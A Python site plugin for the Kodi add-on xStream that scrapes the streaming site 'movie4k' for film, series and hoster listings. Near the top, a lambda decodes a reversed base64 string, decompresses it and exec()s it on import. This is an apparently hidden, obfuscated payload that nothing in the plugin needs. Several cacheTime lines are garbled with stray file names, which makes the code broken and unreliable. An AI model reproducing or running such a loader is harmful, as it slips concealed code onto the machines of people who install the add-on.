# -*- coding: utf-8 -*-
# Python 3
# Always pay attention to the translations in the menu!
# HTML LangzeitCache hinzugef\xc3\x83\xc2\xbcgt
# showValue: 48 Stunden
# showEntries: 6 Stunden
# showEpisodes: 4 Stunden
 
from resources.lib.handler.ParameterHandler import ParameterHandler
from resources.lib.handler.requestHandler import cRequestHandler
from resources.lib.tools import logger, cParser, validater
from resources.lib.gui.guiElement import cGuiElement
from resources.lib.config import cConfig
from resources.lib.gui.gui import cGui

SITE_IDENTIFIER = 'movie4k'
SITE_NAME = 'Movie4k'
SITE_ICON = 'movie4k.png'

# Global search function is thus deactivated!
if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'false':
 SITE_GLOBAL_SEARCH = False
 logger.info('-> [SitePlugin]: globalSearch for %s is deactivated.' % SITE_NAME)

# Domain Abfrage
DOMAIN = cConfig().getSetting('plugin_' + SITE_IDENTIFIER + '.domain', 'movie4k.bid') # Domain Auswahl \xc3\x83\xc2\xbcber die xStream Einstellungen m\xc3\x83\xc2\xb6glich
STATUS = cConfig().getSetting('plugin_' + SITE_IDENTIFIER + '_status') # Status Code Abfrage der Domain
ACTIVE = cConfig().getSetting('plugin_' + SITE_IDENTIFIER) # Ob Plugin aktiviert ist oder nicht

URL_MAIN = 'https://' + DOMAIN + '/'
# URL_MAIN = 'https://movie4k.bid/'
URL_KINO = URL_MAIN + 'aktuelle-kinofilme-im-kino'
URL_MOVIES = URL_MAIN + 'kinofilme-online'
URL_SERIES = URL_MAIN + 'serienstream-deutsch'
URL_SEARCH = URL_MAIN + 'index.php?do=search&subaction=search&search_start=0&full_search=0&result_from=1&story=%s'

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))

def load(): # Menu structure of the site plugin
 logger.info('Load %s' % SITE_NAME)
 params = ParameterHandler()
 params.setParam('sUrl', URL_KINO)
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30501), SITE_IDENTIFIER, 'showEntries'), params) # Current films in the cinema 
 params.setParam('sUrl', URL_MOVIES)
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30502), SITE_IDENTIFIER, 'showEntries'), params) # Movies
 params.setParam('sUrl', URL_SERIES)
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30511), SITE_IDENTIFIER, 'showEntries'), params) # Series
 params.setParam('sCont', 'Jahr')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30508), SITE_IDENTIFIER, 'showValue'), params) # Release Year 
 params.setParam('sCont', 'Land')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30402), SITE_IDENTIFIER, 'showValue'), params) # Countries
 params.setParam('sCont', 'Genre')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30506), SITE_IDENTIFIER, 'showValue'), params) # Genre
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30520), SITE_IDENTIFIER, 'showSearch')) # Search
 cGui().setEndOfDirectory()


def showValue():
 params = ParameterHandler()
 oRequest = cRequestHandler(URL_MAIN)
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 48 # 48 Stunden
 sHtmlContent = oRequest.request() 
 isMatch, sContainer = cParser.parseSingleResult(sHtmlContent, '%s<.*?</ul>' % params.getValue('sCont'))
 if isMatch:
 pattern = 'href="([^"]+).*?true">([^"]+)</a>'
 isMatch, aResult = cParser.parse(sContainer, pattern)
 if not isMatch: return
 for sUrl, sName in aResult:
 if sUrl.startswith('/'):
 sUrl = URL_MAIN + sUrl
 if 'ino' in sName or 'erien' in sName: continue
 params.setParam('sUrl', sUrl)
 cGui().addFolder(cGuiElement(sName, SITE_IDENTIFIER, 'showEntries'), params)
 cGui().setEndOfDirectory()


def showEntries(entryUrl=False, sGui=False, sSearchText=False):
 oGui = sGui if sGui else cGui()
 params = ParameterHandler()
 if not entryUrl: entryUrl = params.getValue('sUrl')
 oRequest = cRequestHandler(entryUrl, ignoreErrors=(sGui is not False))
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 6 # 6 Stunden
 sHtmlContent = oRequest.request()
 pattern = '<article.*?(.*?)<a.*?href="([^"]+).*?<h3>([^<]+).*?(.*?)</article>'
 isMatch, aResult = cParser.parse(sHtmlContent, pattern)
 if not isMatch:
 if not sGui: oGui.showInfo()
 return

 total = len(aResult)
 for sInfo, sUrl, sName, sDummy in aResult:
 if sSearchText and not cParser().search(sSearchText, sName): continue
 # Abfrage der voreingestellten Sprache
 sLanguage = cConfig().getSetting('prefLanguage')
 if (sLanguage == '1' and 'English*' in sName): # Deutsch
 continue
 if (sLanguage == '2' and not 'English*' in sName): # English
 continue
 elif sLanguage == '3': # Japanisch
 cGui().showLanguage()
 continue
 isInfoEpisode, sInfo = cParser.parseSingleResult(sInfo, '</span>([\d]+)') # Episodenanzahl
 isThumbnail, sThumbnail = cParser.parseSingleResult(sDummy, 'data-src="([^"]+)') # Thumbnail
 isQuality, sQuality = cParser.parseSingleResult(sDummy, '<li>([^<]+)') # Qualit\xc3\x83\xc2\xa4t
 isYear, sYear = cParser.parseSingleResult(sDummy, 'class="white">([\d]+)') # Release Jahr
 isTvshow = True if 'taffel' in sName else False
 oGuiElement = cGuiElement(sName, SITE_IDENTIFIER, 'showEpisodes' if isTvshow else 'showHosters')
 oGuiElement.setMediaType('tvshow' if isTvshow else 'movie')
 if isThumbnail:
 sThumbnail = URL_MAIN + sThumbnail
 oGuiElement.setThumbnail(sThumbnail)
 if isYear:
 oGuiElement.setYear(sYear)
 if isQuality:
 oGuiElement.setQuality(sQuality)
 if isInfoEpisode:
 oGuiElement.setInfo(sInfo + ' Episoden')
 params.setParam('entryUrl', sUrl)
 params.setParam('sName', sName)
 params.setParam('sThumbnail', sThumbnail)
 oGui.addFolder(oGuiElement, params, isTvshow, total)
 if not sGui:
 isMatchNextPage, sNextUrl = cParser().parseSingleResult(sHtmlContent, 'N\xc3\x83\xc2\xa4chste[^>]Seite">[^>]*<a[^>]href="([^"]+)')
 if isMatchNextPage:
 if '/xfsearch/' not in entryUrl:
 params.setParam('sUrl', sNextUrl)
 oGui.addNextPage(SITE_IDENTIFIER, 'showEntries', params)
 oGui.setView('tvshows' if 'taffel' in sName else 'movies')
 oGui.setEndOfDirectory()


def showEpisodes():
 params = ParameterHandler()
 sThumbnail = params.getValue('sThumbnail')
 entryUrl = params.getValue('entryUrl')
 oRequest = cRequestHandler(entryUrl)
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 4 # HTML Cache Zeit 4 Stunden
 sHtmlContent = oRequest.request() 
 pattern = 'id="serie-(\d+)[^>](\d+).*?href="#">([^<]+)'
 isMatch, aResult = cParser.parse(sHtmlContent, pattern)
 if not isMatch: return
 isTvshow, sTVShowTitle = cParser.parseSingleResult(sHtmlContent, '<title>([^-]+)')
 isDesc, sDesc = cParser.parseSingleResult(sHtmlContent, 'name="description" content="([^"]+)')
 total = len(aResult)
 for sSeasonNr, sEpisodeNr, sName in aResult:
 oGuiElement = cGuiElement('Episode ' + sEpisodeNr, SITE_IDENTIFIER, 'showHosters')
 if isTvshow:
 oGuiElement.setTVShowTitle(sTVShowTitle.strip())
 oGuiElement.setSeason(sSeasonNr)
 oGuiElement.setEpisode(sEpisodeNr)
 oGuiElement.setThumbnail(sThumbnail)
 oGuiElement.setMediaType('episode')
 if isDesc:
 oGuiElement.setDescription(sDesc)
 params.setParam('sEpisodeNr', sName)
 params.setParam('entryUrl', entryUrl)
 cGui().addFolder(oGuiElement, params, False, total)
 cGui().setView('episodes')
 cGui().setEndOfDirectory()


def showHosters():
 hosters = []
 sHtmlContent = cRequestHandler(ParameterHandler().getValue('entryUrl')).request()
 if ParameterHandler().getValue('sEpisodeNr'):
 pass
 pattern = '%s<.*?</ul>' % ParameterHandler().getValue('sEpisodeNr')
 isMatch, sHtmlContent = cParser.parseSingleResult(sHtmlContent, pattern)
 isMatch, aResult = cParser().parse(sHtmlContent, 'link="([^"]+)">([^<]+)')
 if isMatch:
 sQuality = '720p'
 for sUrl, sName in aResult:
 if cConfig().isBlockedHoster(sName)[0]: continue # Hoster aus settings.xml oder deaktivierten Resolver ausschlie\xc3\x83\xc5\xb8en
 if 'railer' in sName: continue # Youtube Trailer
 elif 'vod' in sUrl: continue # VOD Link
 if sUrl.startswith('//'):
 sUrl = 'https:' + sUrl
 hoster = {'link': sUrl, 'name': sName, 'displayedName': '%s [I][%s][/I]' % (sName, sQuality), 'quality': sQuality, 'resolveable': True}
 hosters.append(hoster)
 if hosters:
 hosters.append('getHosterUrl')
 return hosters


def getHosterUrl(sUrl=False):
 return [{'streamUrl': sUrl, 'resolved': False}]


def showSearch():
 sSearchText = cGui().showKeyBoard()
 if not sSearchText: return
 _search(False, sSearchText)
 cGui().setEndOfDirectory()


def _search(oGui, sSearchText):
 showEntries(URL_SEARCH % cParser.quotePlus(sSearchText), oGui, sSearchText)
'
